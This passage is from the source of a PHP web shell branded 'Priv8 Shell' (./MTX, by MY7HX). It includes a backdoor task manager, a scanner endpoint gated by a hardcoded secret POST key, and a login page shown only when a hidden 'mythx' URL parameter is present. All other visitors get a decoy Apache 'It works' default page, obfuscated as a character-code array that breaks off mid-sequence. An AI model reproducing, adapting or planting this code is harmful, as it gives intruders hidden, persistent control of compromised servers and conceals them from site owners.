        task_proccess +
        "`, `" +
        task_id +
        "`, `" +
        task_url +
        "`); task_manager(`" +
        task_proccess +
        "`, `" +
        task_id +
        "`, `remove`); BSUpdateTask();";

      nmRaw = task_id.replace(".php", "");
      nmRaw = nmRaw.replace(".", "");

      $("#table-body-backdoor-task").append(`
        <tr class="border-b border-themecolor-600">
            <td scope="row" class="px-6 py-4 whitespace-nowrap font-normal text-themecolor-400">
                <div class="flex items-center justify-start gap-2">
                    <input disabled type="text" value="${nmRaw}"
                        class="block pt-2 text-sm border rounded-lg w-full bg-themecolor-800 border-themecolor-600 placeholder-themecolor-400 focus:ring-primary focus:border-primary">
                </div>
            </td>
            <td scope="row" class="px-6 py-4 whitespace-nowrap font-normal text-themecolor-green">
                <div class="flex items-center justify-start gap-2">
                    <span class="w-full hover:brightness-75">Running</span>
                </div>
            </td>
            <td class="px-6 py-4">
                <a onclick="${task_onclick}"
                    class="text-sm h-auto cursor-pointer font-medium rounded w-auto text-foreground bg-themecolor-800 hover:bg-themecolor-red px-2 py-1 border border-themecolor-600">Stop
                </a>
            </td>
        </tr>
        `);
    });
  }

}

function BSPayload(ele) {
  const scan_name =
    "'. $GLOBALS['ER0_string']['scan_php_payload_byname'] .'";
  const scan_content =
    "'. $GLOBALS['ER0_string']['scan_php_payload_bycontent'] .'";

  const thisEle = $(ele).val();
  const payloadField = $("#payload");

  if (thisEle === "name" || thisEle === "content") {
    const title = thisEle === "name" ? "By Name" : "By Content";
    const content = thisEle === "name" ? scan_name : scan_content;

    $(`#payload-title`).html(
      `<span class="flex">Scan List: <span class="ml-1 text-themecolor-orange">${title}</span></span><span class="text-gray-500">(separate by comma ",")</span>`
    );
    payloadField.val(content);

    payloadField.addClass("text-foreground");
    document.getElementById("payload").setAttribute("rows", "10");
    document.getElementById("payload").removeAttribute("disabled");
    document.getElementById("payload").removeAttribute("readonly");
  } else {
    $(`#payload-title`).html(
      `<span class="flex">Scan List: <span class="ml-1 text-themecolor-orange">File Name, File Content</span></span>`
    );
    payloadField.removeClass("text-foreground");
    payloadField.val("Scan All {filename => filecontent}");
    document.getElementById("payload").setAttribute("rows", "2");
    document.getElementById("payload").setAttribute("disabled", "");
    document.getElementById("payload").setAttribute("readonly", "");
  }
}
';
        }
    }

    public static function __backdoorscanner_function()
    {
        if (isset($_POST["key"]) && Request::__post_request("key") == "BADKACRCONERSNO") {
            // init, post required (dir)
            $path = Utils::__string_dec(Request::__post_request("dir"));
            $path = Utils::__construct_path($path);
            chdir($path);
            $STATUS = "failed";
            $DETAIL = "";
            $UPDATE = "NOTUSE";

            $data_config = array(
                'data' => "backdoor",
                'dir' => $path,
                'hiddenVal' => null,
                'titleHref' => null,
                'action' => [['href', 'open', 'open'], ['button', 'delete', 'remove data']],
                'jsonKey' => ['f', ['p', ['input', 'disabled']], ['s', ['input', 'disabled']]],
                'statusKey' => ['path' => 'p', 'file' => 'f'],
                'showStatus' => true,
                'rowStyle' => ['f' => ['font-bold', 'text-foreground'], 'p' => ['font-normal', 'text-gray-500'], 's' => ['font-normal', 'text-themecolor-orange']],
                'tableHeader' => ['Filename', 'Path', 'Suspicious'],
                'return' => 'tbody'
            );

            $updateList = Utils::__charcode_enc(Utils::__get_data($data_config));
            $STATUS = 'log';
            $DETAIL = "progress saved.";
            $UPDATE = '$(`#table-body-backdoor`).html(charcodeDec(`' . $updateList . '`)); for (let i = 1; i <= document.getElementsByClassName("cls-backdoor").length; i++) { $("#found-bd").text(i); }';

            // Return response in json
            // Don`t change these values unless you know what you`re doing
            $response = [
                "status" => Utils::__charcode_enc($STATUS),
                "detail" => Utils::__charcode_enc($DETAIL),
                "update" => Utils::__charcode_enc($UPDATE)
            ];
            header("Content-Type: application/json");
            echo json_encode($response);
            exit();
        }
    }
}


/** CLASS FRONTEND ============================================================================ */

class Frontend
{
    public static function __construct_html($isLogin)
    {
        $CHARSET = $GLOBALS['ER0_config']['charset'];
        $TITLE = $GLOBALS['ER0_string']['title'];
        $ICON = $GLOBALS['ER0_source']['icon'];
        $TEXTCOLOR = 'text-foreground';
        $BGCOLOR = 'bg-background';
        $IMPORT_START = '
        <link rel="stylesheet" href="' . $GLOBALS['ER0_source']['boxicons'] . '">
        <link rel="stylesheet" href="' . $GLOBALS['ER0_source']['animate'] . '">
        <link rel="stylesheet" href="' . $GLOBALS['ER0_source']['flowbitecss'] . '">
        <link id="editor-theme" rel="stylesheet" href="' . $GLOBALS['ER0_source']['highlightjscss'] . '">
        <script src="' . $GLOBALS['ER0_source']['tailwind'] . '"></script>
        <script src="' . $GLOBALS['ER0_source']['jquery'] . '"></script>
        <script src="' . $GLOBALS['ER0_source']['jquerytablesorter'] . '"></script>
        <script src="' . $GLOBALS['ER0_source']['sweetalert2'] . '"></script>
        <script src="' . $GLOBALS['ER0_source']['highlightjs'] . '"></script>
        <script>' . $GLOBALS['themes']['config'] . '</script>
        <style>' . self::__shell_style() . '</style>
        <style id="editor-style" type="text/css"></style>';

        $IMPORT_END = '
        <script src="' . $GLOBALS['ER0_source']['flowbitejs'] . '"></script>
        ' . self::__shell_javascript();

        $header = '
        <div class="hidden sm:grid border-e-2 border-themecolor-500 w-40 h-full gap-2 sm:w-28 bg-background">
            <span class="flex justify-center items-center font-medium text-md text-center text-themecolor-500" style="line-height:1;">' . $GLOBALS['ER0_string']['version'] . '</span>
            <span class="flex justify-center items-center font-medium text-md text-center text-primary" style="line-height:1;"><a href="' . $GLOBALS['ER0_string']['contact'] . '" class="hover:brightness-75">./MY7HX</a></span>
        </div>';

        $header_user = '
        <div class="hidden sm:grid border-s-2 border-themecolor-500 w-40 h-full gap-2 sm:w-28 bg-background">
            <span class="flex justify-center items-center font-medium text-md text-center ' . $TEXTCOLOR . ' gap-2" style="line-height:1;"><i class="bx bx-user" ></i> ' . Session::__session_manager('GET', null, 'usr') . '</span>
            <span class="flex justify-center items-center font-medium text-lg text-center ' . $TEXTCOLOR . ' gap-2" style="line-height:1;"><a id="setting-btn"><i class="bx bx-cog text-primary hover:brightness-75"></i></a>|<a href="?' . $GLOBALS['ER0_string']['logout'] . '" class="text-themecolor-red hover:brightness-75"> <i class="bx bx-log-out-circle"></i></a></span>
        </div>';

        $title = '
        <link rel="shortcut icon" href="' . $ICON . '" type="image/x-icon">
        <title>✦ ' . $TITLE . ' ✦</title>';

        return
'<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="'. $CHARSET .'">
    <meta http-equiv="Content-Type" content="text/html;" charset="'. $CHARSET .'">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    '. (Session::__check_session() ? $title : '') .'
    '. $IMPORT_START .'


</head>

<body class="setFonts '. (!Session::__check_session() ? 'flex justify-center items-center h-screen' : '') .' bg-background">
    <center>
        <div class="w-full h-auto '. (Session::__check_session() ? 'sm:pt-8 pt-5' : '') .' bg-background">

            <div class="relative w-auto sm:mb-8 mb-5 flex justify-center items-center" target="_blank">

                '. (Session::__check_session() ? $header : '') .'


                <span class="h-px flex-1 bg-themecolor-500"></span>
                <a href="'. $GLOBALS['ER0_string']['contact'] .'" class="grid border-x-2 border-themecolor-500 w-40 sm:w-52 bg-background">
                    <span class="font-medium text-[1.9rem] sm:text-[2.4rem] text-center '. $TEXTCOLOR .' mb-2" style="line-height:1;">./MTX</span>
                    <span class="font-medium text-sm sm:text-lg text-center '. $TEXTCOLOR .'">Priv8 Shell</span>
                </a>
                <span class="h-px flex-1 bg-themecolor-500"></span>

                '. (Session::__check_session() ? $header_user : '') .'

            </div>

            '. ($isLogin ? self::__main_view() : self::__login_view()) .'

        </div>
        <div class="'. (!Session::__check_session() ? 'mt-5' : '') .' w-full '. $BGCOLOR .'">
            <a href="'. $GLOBALS['ER0_string']['contact'] .'" class="font-medium text-md text-center text-themecolor-700 hover:text-foreground" target="_blank">Copyright &copy; ./MY7HX </a>
        </div>
    </center>
    '. $IMPORT_END .'
</body>

</html>';
    }

    private static function __login_view($style = 'default')
    {
        if (isset(${"_GET"}['mythx'])) {
            return '
            <div class="flex flex-col items-center justify-center px-6 py-8 lg:py-0 w-96">
                    <form class="space-y-4 w-full" action="" method="post">
                        <div class="relative mb-6">
                            <div class="absolute inset-y-0 start-0 flex items-center ps-3.5 pointer-events-none">
                                <i class="bx bx-user text-xl text-themecolor-400"></i>
                            </div>
                            <input type="password" name="usr" placeholder="••••••••••••••••" class="ps-10 bg-themecolor-700 border border-themecolor-600 placeholder-themecolor-400 text-foreground sm:text-sm rounded focus:ring-primary focus:border-primary block w-full p-2.5" required>
                        </div>
                        <div class="relative mb-6">
                            <div class="absolute inset-y-0 start-0 flex items-center ps-3.5 pointer-events-none">
                                <i class="bx bx-key text-xl text-themecolor-400"></i>
                            </div>
                            <input type="password" name="psw" placeholder="••••••••••••••••" class="ps-10 bg-themecolor-700 border border-themecolor-600 placeholder-themecolor-400 text-foreground sm:text-sm rounded focus:ring-primary focus:border-primary block w-full p-2.5" required>
                        </div>

                        <input type="submit" class="hidden">

                    </form>
                </div>
            ';
        } else {
            return '<script>document.documentElement.innerHTML=String.fromCharCode(10, 60, 33, 68, 79, 67, 84, 89, 80, 69, 32, 104, 116, 109, 108, 32, 80, 85, 66, 76, 73, 67, 32, 34, 45, 47, 47, 87, 51, 67, 47, 47, 68, 84, 68, 32, 88, 72, 84, 77, 76, 32, 49, 46, 48, 32, 84, 114, 97, 110, 115, 105, 116, 105, 111, 110, 97, 108, 47, 47, 69, 78, 34, 32, 34, 104, 116, 116, 112, 58, 47, 47, 119, 119, 119, 46, 119, 51, 46, 111, 114, 103, 47, 84, 82, 47, 120, 104, 116, 109, 108, 49, 47, 68, 84, 68, 47, 120, 104, 116, 109, 108, 49, 45, 116, 114, 97, 110, 115, 105, 116, 105, 111, 110, 97, 108, 46, 100, 116, 100, 34, 62, 10, 60, 104, 116, 109, 108, 32, 120, 109, 108, 110, 115, 61, 34, 104, 116, 116, 112, 58, 47, 47, 119, 119, 119, 46, 119, 51, 46, 111, 114, 103, 47, 49, 57, 57, 57, 47, 120, 104, 116, 109, 108, 34, 62, 10, 32, 32, 60, 33, 45, 45, 10, 32, 32, 32, 32, 77, 111, 100, 105, 102, 105, 101, 100, 32, 102, 114, 111, 109, 32, 116, 104, 101, 32, 68, 101, 98, 105, 97, 110, 32, 111, 114, 105, 103, 105, 110, 97, 108, 32, 102, 111, 114, 32, 85, 98, 117, 110, 116, 117, 10, 32, 32, 32, 32, 76, 97, 115, 116, 32, 117, 112, 100, 97, 116, 101, 100, 58, 32, 50, 48, 49, 52, 45, 48, 51, 45, 49, 57, 10, 32, 32, 32, 32, 83, 101, 101, 58, 32, 104, 116, 116, 112, 115, 58, 47, 47, 108, 97, 117, 110, 99, 104, 112, 97, 100, 46, 110, 101, 116, 47, 98, 117, 103, 115, 47, 49, 50, 56, 56, 54, 57, 48, 10, 32, 32, 45, 45, 62, 10, 32, 32, 60, 104, 101, 97, 100, 62, 10, 32, 32, 32, 32, 60, 109, 101, 116, 97, 32, 104, 116, 116, 112, 45, 101, 113, 117, 105, 118, 61, 34, 67, 111, 110, 116, 101, 110, 116, 45, 84, 121, 112, 101, 34, 32, 99, 111, 110, 116, 101, 110, 116, 61, 34, 116, 101, 120, 116, 47, 104, 116, 109, 108, 59, 32, 99, 104, 97, 114, 115, 101, 116, 61, 85, 84, 70, 45, 56, 34, 32, 47, 62, 10, 32, 32, 32, 32, 60, 116, 105, 116, 108, 101, 62, 65, 112, 97, 99, 104, 101, 50, 32, 85, 98, 117, 110, 116, 117, 32, 68, 101, 102, 97, 117, 108, 116, 32, 80, 97, 103, 101, 58, 32, 73, 116, 32, 119, 111, 114, 107, 115, 60, 47, 116, 105, 116, 108, 101, 62, 10, 32, 32, 32, 32, 60, 115, 116, 121, 108, 101, 32, 116, 121, 112, 101, 61, 34, 116, 101, 120, 116, 47, 99, 115, 115, 34, 32, 109, 101, 100, 105, 97, 61, 34, 115, 99, 114, 101, 101, 110, 34, 62, 10, 32, 32, 42, 32, 123, 10, 32, 32, 32, 32, 109, 97, 114, 103, 105, 110, 58, 32, 48, 112, 120, 32, 48, 112, 120, 32, 48, 112, 120, 32, 48, 112, 120, 59, 10, 32, 32, 32, 32, 112, 97, 100, 100, 105, 110, 103, 58, 32, 48, 112, 120, 32, 48, 112, 120, 32, 48, 112, 120, 32, 48, 112, 120, 59, 10, 32, 32, 125, 10, 10, 32, 32, 98, 111, 100, 121, 44, 32, 104, 116, 109, 108, 32, 123, 10, 32, 32, 32, 32, 112, 97, 100, 100, 105, 110, 103, 58, 32, 51, 112, 120, 32, 51, 112, 120, 32, 51, 112, 120, 32, 51, 112, 120, 59, 10, 10, 32, 32, 32, 32, 98, 97, 99, 107, 103, 114, 111, 117, 110, 100, 45, 99, 111, 108, 111, 114, 58, 32, 35, 68, 56, 68, 66, 69, 50, 59, 10, 10, 32, 32, 32, 32, 102, 111, 110, 116, 45, 102, 97, 109, 105, 108, 121, 58, 32, 86, 101, 114, 100, 97, 110, 97, 44, 32, 115, 97, 110, 115, 45, 115, 101, 114, 105, 102, 59, 10, 32, 32, 32, 32, 102, 111, 110, 116, 45, 115, 105, 122, 101, 58, 32, 49, 49, 112, 116, 59, 10, 32, 32, 32, 32, 116, 101, 120, 116, 45, 97, 108, 105, 103, 110, 58, 32, 99, 101, 110, 116, 101, 114, 59, 10, 32, 32, 125, 10, 10, 32, 32, 100, 105, 118, 46, 109, 97, 105, 110, 95, 112, 97, 103, 101, 32, 123, 10, 32, 32, 32, 32, 112, 111, 115, 105, 116, 105, 111, 110, 58, 32, 114, 101, 108, 97, 116, 105, 118, 101, 59, 10, 32, 32, 32, 32, 100, 105, 115, 112, 108, 97, 121, 58, 32, 116, 97, 98, 108, 101, 59, 10, 10, 32, 32, 32, 32, 119, 105, 100, 116, 104, 58, 32, 56, 48, 48, 112, 120, 59, 10, 10, 32, 32, 32, 32, 109, 97, 114, 103, 105, 110, 45, 98, 111, 116, 116, 111, 109, 58, 32, 51, 112, 120, 59, 10, 32, 32, 32, 32, 109, 97, 114, 103, 105, 110, 45, 108, 101, 102, 116, 58, 32, 97, 117, 116, 111, 59, 10, 32, 32, 32, 32, 109, 97, 114, 103, 105, 110, 45, 114, 105, 103, 104, 116, 58, 32, 97, 117, 116, 111, 59, 10, 32, 32, 32, 32, 112, 97, 100, 100, 105, 110, 103, 58, 32, 48, 112, 120, 32, 48, 112, 120, 32, 48, 112, 120, 32, 48, 112, 120, 59, 10, 10, 32, 32, 32, 32, 98, 111, 114, 100, 101, 114, 45, 119, 105, 100, 116, 104, 58, 32, 50, 112, 120, 59, 10, 32, 32, 32, 32, 98, 111, 114, 100, 101, 114, 45, 99, 111, 108, 111, 114, 58, 32, 35, 50, 49, 50, 55, 51, 56, 59, 10, 32, 32, 32, 32, 98, 111, 114, 100, 101, 114, 45, 115, 116, 121, 108, 101, 58, 32, 115, 111, 108, 105, 100, 59, 10, 10, 32, 32, 32, 32, 98, 97, 99, 107, 103, 114, 111, 117, 110, 100, 45, 99, 111, 108, 111, 114, 58, 32, 35, 70, 70, 70, 70, 70, 70, 59, 10, 10, 32, 32, 32, 32, 116, 101, 120, 116, 45, 97, 108, 105, 103, 110, 58, 32, 99, 101, 110, 116, 101, 114, 59, 10, 32, 32, 125, 10, 10, 32, 32, 100, 105, 118, 46, 112, 97, 103, 101, 95, 104, 101, 97, 100, 101, 114, 32, 123, 10, 32, 32, 32, 32, 104, 101, 105, 103, 104, 116, 58, 32, 57, 57, 112, 120, 59, 10, 32, 32, 32, 32, 119, 105, 100, 116, 104, 58, 32, 49, 48, 48, 37, 59, 10, 10, 32, 32, 32, 32, 98, 97, 99, 107, 103, 114, 111, 117, 110, 100, 45, 99, 111, 108, 111, 114, 58, 32, 35, 70, 53, 70, 54, 70, 55, 59, 10, 32, 32, 125, 10, 10, 32, 32, 100, 105, 118, 46, 112, 97, 103, 101, 95, 104, 101, 97, 100, 101, 114, 32, 115, 112, 97, 110, 32, 123, 10, 32, 32, 32, 32, 109, 97, 114, 103, 105, 110, 58, 32, 49, 53, 112, 120, 32, 48, 112, 120, 32, 48, 112, 120, 32, 53, 48, 112, 120, 59, 10, 10, 32, 32, 32, 32, 102, 111, 110, 116, 45, 115, 105, 122, 101, 58, 32, 49, 56, 48, 37, 59, 10, 32, 32, 32, 32, 102, 111, 110, 116, 45, 119, 101, 105, 103, 104, 116, 58, 32, 98, 111, 108, 100, 59, 10, 32, 32, 125, 10, 10, 32, 32, 100, 105, 118, 46, 112, 97, 103, 101, 95, 104, 101, 97, 100, 101, 114, 32, 105, 109, 103, 32, 123, 10, 32, 32, 32, 32, 109, 97, 114, 103, 105, 110, 58, 32, 51, 112, 120, 32, 48, 112, 120, 32, 48, 112, 120, 32, 52, 48, 112, 120, 59, 10, 10, 32, 32, 32, 32, 98, 111, 114, 100, 101, 114, 58, 32, 48, 112, 120, 32, 48, 112, 120, 32, 48, 112, 120, 59, 10, 32, 32, 125, 10, 10, 32, 32, 100, 105, 118, 46, 116, 97, 98, 108, 101, 95, 111, 102, 95, 99, 111, 110, 116, 101, 110, 116, 115, 32, 123, 10, 32, 32, 32, 32, 99, 108, 101, 97, 114, 58, 32, 108, 101, 102, 116, 59, 10, 10, 32, 32, 32, 32, 109, 105, 110, 45, 119, 105, 100, 116, 104, 58, 32, 50, 48, 48, 112, 120, 59, 10, 10, 32, 32, 32, 32, 109, 97, 114, 103, 105, 110, 58, 32, 51, 112, 120, 32, 51, 112, 120, 32, 51, 112, 120, 32, 51, 112, 120, 59, 10, 10, 32, 32, 32, 32, 98, 97, 99, 107, 103, 114, 111, 117, 110, 100, 45, 99, 111, 108, 111, 114, 58, 32, 35, 70, 70, 70, 70, 70, 70, 59, 10, 10, 32, 32, 32, 32, 116, 101, 120, 116, 45, 97, 108, 105, 103, 110, 58, 32, 108, 101, 102, 116, 59, 10, 32, 32, 125, 10, 10, 32, 32, 100, 105, 118, 46, 116, 97, 98, 108, 101, 95, 111, 102, 95, 99, 111, 110, 116, 101, 110, 116, 115, 95, 105, 116, 101, 109, 32, 123, 10, 32, 32, 32, 32, 99, 108, 101, 97, 114, 58, 32, 108, 101, 102, 116, 59, 10, 10, 32, 32, 32, 32, 119, 105, 100, 116, 104, 58, 32, 49, 48, 48, 37, 59, 10, 10, 32, 32, 32, 32, 109, 97, 114, 103, 105, 110, 58, 32, 52, 112, 120, 32, 48, 112, 120, 32, 48, 112, 120, 32, 48, 112, 120, 59, 10, 10, 32, 32, 32, 32, 98, 97, 99, 107, 103, 114, 111, 117, 110, 100, 45, 99, 111, 108, 111, 114, 58, 32, 35, 70, 70, 70, 70, 70, 70, 59, 10, 10, 32, 32, 32, 32, 99, 111, 108, 111, 114, 58, 32, 35, 48, 48, 48, 48, 48, 48, 59, 10, 32, 32, 32, 32, 116, 101, 120, 116, 45, 97, 108, 105, 103, 110, 58, 32, 108, 101, 102, 116, 59, 10, 32, 32, 125, 10, 10, 32, 32, 100, 105, 118, 46, 116, 97, 98, 108, 101, 95, 111, 102, 95, 99, 111, 110, 116, 101, 110, 116, 115, 95, 105, 116, 101, 109, 32, 97, 32, 123, 10, 32, 32, 32, 32, 109, 97, 114, 103, 105, 110, 58, 32, 54, 112, 120, 32, 48, 112, 120, 32, 48, 112, 120, 32, 54, 112, 120, 59, 10, 32, 32, 125, 10, 10, 32, 32, 100, 105, 118, 46, 99, 111, 110, 116, 101, 110, 116, 95, 115, 101, 99, 116, 105, 111, 110, 32, 123, 10, 32, 32, 32, 32, 109, 97, 114, 103, 105, 110, 58, 32, 51, 112, 120, 32, 51, 112, 120, 32, 51, 112, 120, 32, 51, 112, 120, 59, 10, 10, 32, 32, 32, 32, 98, 97, 99, 107, 103, 114, 111, 117, 110, 100, 45, 99, 111, 108, 111, 114, 58, 32, 35, 70, 70, 70, 70, 70, 70, 59, 10, 10, 32, 32, 32, 32, 116, 101, 120, 116, 45, 97, 108, 105, 103, 110, 58, 32, 108, 101, 102, 116, 59, 10, 32, 32, 125, 10, 10, 32, 32, 100, 105, 118, 46, 99, 111, 110, 116, 101, 110, 116, 95, 115, 101, 99, 116, 105, 111, 110, 95, 116, 101, 120, 116, 32, 123, 10, 32, 32, 32, 32, 112, 97, 100, 100, 105, 110, 103, 58, 32, 52, 112, 120, 32, 56, 112, 120, 32, 52, 112, 120, 32, 56, 112, 120, 59, 10, 10, 32, 32, 32, 32, 99, 111, 108, 111, 114, 58, 32, 35, 48, 48, 48, 48, 48, 48, 59, 10, 32, 32, 32, 32, 102, 111, 110, 116, 45, 115, 105, 122, 101, 58, 32, 49, 48, 48, 37, 59, 10, 32, 32, 125, 10, 10, 32, 32, 100, 105, 118, 46, 99, 111, 110, 116, 101, 110, 116, 95, 115, 101, 99, 116, 105, 111, 110, 95, 116, 101, 120, 116, 32, 112, 114, 101, 32, 123, 10, 32, 32, 32, 32, 109, 97, 114, 103, 105, 110, 58, 32, 56, 112, 120, 32, 48, 112, 120, 32, 56, 112, 120, 32, 48, 112, 120, 59, 10, 32, 32, 32, 32, 112, 97, 100, 100, 105, 110, 103, 58, 32, 56, 112, 120, 32, 56, 112, 120, 32, 56, 112, 120, 32, 56, 112, 120, 59, 10, 10, 32, 32, 32, 32, 98, 111, 114, 100, 101, 114, 45, 119, 105, 100, 116, 104, 58, 32, 49, 112, 120, 59, 10, 32, 32, 32, 32, 98, 111, 114, 100, 101, 114, 45, 115, 116, 121, 108, 101, 58, 32, 100, 111, 116, 116, 101, 100, 59, 10, 32, 32, 32, 32, 98, 111, 114, 100, 101, 114, 45, 99, 111, 108, 111, 114, 58, 32, 35, 48, 48, 48, 48, 48, 48, 59, 10, 10, 32, 32, 32, 32, 98, 97, 99, 107, 103, 114, 111, 117, 110, 100, 45, 99, 111, 108, 111, 114, 58, 32, 35, 70, 53, 70, 54, 70, 55, 59, 10, 10, 32, 32, 32, 32, 102, 111, 110, 116, 45, 115, 116, 121, 108, 101, 58, 32, 105, 116, 97, 108, 105, 99, 59, 10, 32, 32, 125, 10, 10, 32, 32, 100, 105, 118, 46, 99, 111, 110, 116, 101, 110, 116, 95, 115, 101, 99, 116, 105, 111, 110, 95, 116, 101, 120, 116, 32, 112, 32, 123, 10, 32, 32, 32, 32, 109, 97, 114, 103, 105, 110, 45, 98, 111, 116, 116, 111, 109, 58, 32, 54, 112, 120, 59, 10, 32, 32, 125, 10, 10, 32, 32, 100, 105, 118, 46, 99, 111, 110, 116, 101, 110, 116, 95, 115, 101, 99, 116, 105, 111, 110, 95, 116, 101, 120, 116, 32, 117, 108, 44, 32, 100, 105, 118, 46, 99, 111, 110, 116, 101, 110, 116, 95, 115, 101, 99, 116, 105, 111, 110, 95, 116, 101, 120, 116, 32, 108, 105, 32, 123, 10, 32, 32, 32, 32, 112, 97, 100, 100, 105, 110, 103, 58, 32, 52, 112, 120, 32, 56, 112, 120, 32, 52, 112, 120, 32, 49, 54, 112, 120, 59, 10, 32, 32, 125, 10, 10, 32, 32, 100, 105, 118, 46, 115, 101, 99, 116, 105, 111, 110, 95, 104, 101, 97, 100, 101, 114, 32, 123, 10, 32, 32, 32, 32, 112, 97, 100, 100, 105, 110, 103, 58, 32, 51, 112, 120, 32, 54, 112, 120, 32, 51, 112, 120, 32, 54, 112, 120, 59, 10, 10, 32, 32, 32, 32, 98, 97, 99, 107, 103, 114, 111, 117, 110, 100, 45, 99, 111, 108, 111, 114, 58, 32, 35, 56, 69, 57, 67, 66, 50, 59, 10, 10, 32, 32, 32, 32, 99, 111, 108, 111, 114, 58, 32, 35, 70, 70, 70, 70, 70, 70, 59, 10, 32, 32, 32, 32, 102, 111, 110, 116, 45, 119, 101, 105, 103, 104, 116, 58, 32, 98, 111, 108, 100, 59, 10, 32, 32, 32, 32, 102, 111, 110, 116, 45, 115, 105, 122, 101, 58, 32, 49, 49, 50, 37, 59, 10, 32, 32, 32, 32, 116, 101, 120, 116, 45, 97, 108, 105, 103, 110, 58, 32, 99, 101, 110, 116, 101, 114, 59, 10, 32, 32, 125, 10, 10, 32, 32, 100, 105, 118, 46, 115, 101, 99, 116, 105, 111, 110, 95, 104, 101, 97, 100, 101, 114, 95, 114, 101, 100, 32, 123, 10, 32, 32, 32, 32, 98, 97, 99, 107, 103, 114, 111, 117, 110, 100, 45, 99, 111, 108, 111, 114, 58, 32, 35, 67, 68, 50, 49, 52, 70, 59, 10, 32, 32, 125, 10, 10, 32, 32, 100, 105, 118, 46, 115, 101, 99, 116, 105, 111, 110, 95, 104, 101, 97, 100, 101, 114, 95, 103, 114, 101, 121, 32, 123, 10, 32, 32, 32, 32, 98, 97, 99, 107, 103, 114, 111, 117, 110, 100, 45, 99, 111, 108, 111, 114, 58, 32, 35, 57, 70, 57, 51, 56, 54, 59, 10, 32, 32, 125, 10, 10, 32, 32, 46, 102, 108, 111, 97, 116, 105, 110, 103, 95, 101, 108, 101, 109, 101, 110, 116, 32, 123, 10, 32, 32, 32, 32, 112, 111, 115, 105, 116, 105, 111, 110, 58, 32, 114, 101, 108, 97, 116, 105, 118, 101, 59, 10, 32, 32, 32, 32, 102, 108, 111, 97, 116, 58, 32, 108, 101, 102, 116, 59, 10, 32, 32, 125, 10, 10, 32, 32, 100, 105, 118, 46, 116, 97, 98, 108, 101, 95, 111, 102, 95, 99, 111, 110, 116, 101, 110, 116, 115, 95, 105, 116, 101, 109, 32, 97, 44, 10, 32, 32, 100, 105, 118, 46, 99, 111, 110, 116, 101, 110, 116, 95, 115, 101, 99, 116, 105, 111, 110, 95, 116, 101, 120, 116, 32, 97, 32, 123, 10, 32, 32, 32, 32, 116, 101, 120, 116, 45, 100, 101, 99, 111, 114, 97, 116, 105, 111, 110, 58, 32, 110, 111, 110, 101, 59, 10, 32, 32, 32, 32, 102, 111, 110, 116, 45, 119, 101, 105, 103, 104, 116, 58, 32, 98, 111, 108, 100, 59, 10, 32, 32, 125, 10, 10, 32, 32, 100, 105, 118, 46, 116, 97, 98, 108, 101, 95, 111, 102, 95, 99, 111, 110, 116, 101, 110, 116, 115, 95, 105, 116, 101, 109, 32, 97, 58, 108, 105, 110, 107, 44, 10, 32, 32, 100, 105, 118, 46, 116, 97, 98, 108, 101, 95, 111, 102, 95, 99, 111, 110, 116, 101, 110, 116, 115, 95, 105, 116, 101, 109, 32, 97, 58, 118, 105, 115, 105, 116, 101, 100, 44, 10, 32, 32, 100, 105, 118, 46, 116, 97, 98, 108, 101, 95, 111, 102, 95, 99, 111, 110, 116, 101, 110, 116, 115, 95, 105, 116, 101, 109, 32, 97, 58, 97, 99, 116, 105, 118, 101, 32, 123, 10, 32, 32, 32, 32, 99, 111, 108, 111, 114, 58, 32, 35, 48, 48, 48, 48, 48, 48, 59, 10, 32, 32, 125, 10, 10, 32, 32, 100, 105, 118, 46, 116, 97, 98, 108, 101, 95, 111, 102, 95, 99, 111, 110, 116, 101, 110, 116, 115, 95, 105, 116, 101, 109, 32, 97, 58, 104, 111, 118, 101, 114, 32, 123, 10, 32, 32, 32, 32, 98, 97, 99, 107, 103, 114, 111, 117, 110, 100, 45, 99, 111, 108, 111, 114, 58, 32, 35, 48, 48, 48, 48, 48, 48, 59, 10, 10, 32, 32, 32, 32, 99, 111, 108, 111, 114, 58, 32, 35, 70, 70, 70, 70, 70, 70, 59, 10, 32, 32, 125, 10, 10, 32, 32, 100, 105, 118, 46, 99, 111, 110, 116, 101, 110, 116, 95, 115, 101, 99, 116, 105, 111, 110, 95, 116, 101, 120, 116, 32, 97, 58, 108, 105, 110, 107, 44, 10, 32, 32, 100, 105, 118, 46, 99, 111, 110, 116, 101, 110, 116, 95, 115, 101, 99, 116, 105, 111, 110, 95, 116, 101, 120, 116, 32, 97, 58, 118, 105, 115, 105, 116, 101, 100, 44, 10, 32, 32, 32, 100, 105, 118, 46, 99, 111, 110, 116, 101, 110, 116, 95, 115, 101, 99, 116, 105, 111, 110, 95, 116, 101, 120, 116, 32, 97, 58, 97, 99, 116, 105, 118, 101, 32, 123, 10, 32, 32, 32, 32, 98, 97, 99, 107, 103, 114, 111, 117, 110, 100, 45, 99, 111, 108, 111, 114, 58, 32, 35, 68, 67, 68, 70, 69, 54, 59, 10, 10, 32, 32, 32, 32, 99, 111, 108, 111, 114, 58, 32, 35, 48, 48, 48, 48, 48, 48, 59, 10, 32, 32, 125, 10, 10, 32, 32, 100, 105, 118, 46, 99, 111, 110, 116, 101, 110, 116, 95, 115, 101, 99, 116, 105, 111, 110, 95, 116, 101, 120, 116, 32, 97, 58, 104, 111, 118, 101, 114, 32, 123, 10, 32, 32, 32, 32, 98, 97, 99, 107, 103, 114, 111, 117, 110, 100, 45, 99, 111, 108, 111, 114, 58, 32, 35, 48, 48, 48, 48, 48, 48, 59, 10, 10, 32, 32, 32, 32, 99, 111, 108, 111, 114, 58, 32, 35, 68, 67, 68, 70, 69, 54, 59, 10, 32, 32, 125, 10, 10, 32, 32, 100, 105, 118, 46, 118, 97, 108, 105, 100, 97, 116, 111, 114, 32, 123, 10, 32, 32, 125, 10, 32, 32, 32, 32, 60, 47, 115, 116, 121, 108, 101, 62, 10, 32, 32, 60, 47, 104, 101, 97, 100, 62, 10, 32, 32, 60, 98, 111, 100, 121, 62, 10, 32, 32, 32, 32, 60, 100, 105, 118, 32, 99, 108, 97, 115, 115, 61, 34, 109, 97, 105, 110, 95, 112, 97, 103, 101, 34, 62, 10, 32, 32, 32, 32, 32, 32, 60, 100, 105, 118, 32, 99, 108, 97, 115, 115, 61, 34, 112, 97, 103, 101, 95, 104, 101, 97, 100, 101, 114, 32, 102, 108, 111, 97, 116, 105, 110, 103, 95, 101, 108, 101, 109, 101, 110, 116, 34, 62, 10, 32, 32, 32, 32, 32, 32, 32, 32, 60, 105, 109, 103, 32, 115, 114, 99, 61, 34, 47, 105, 99, 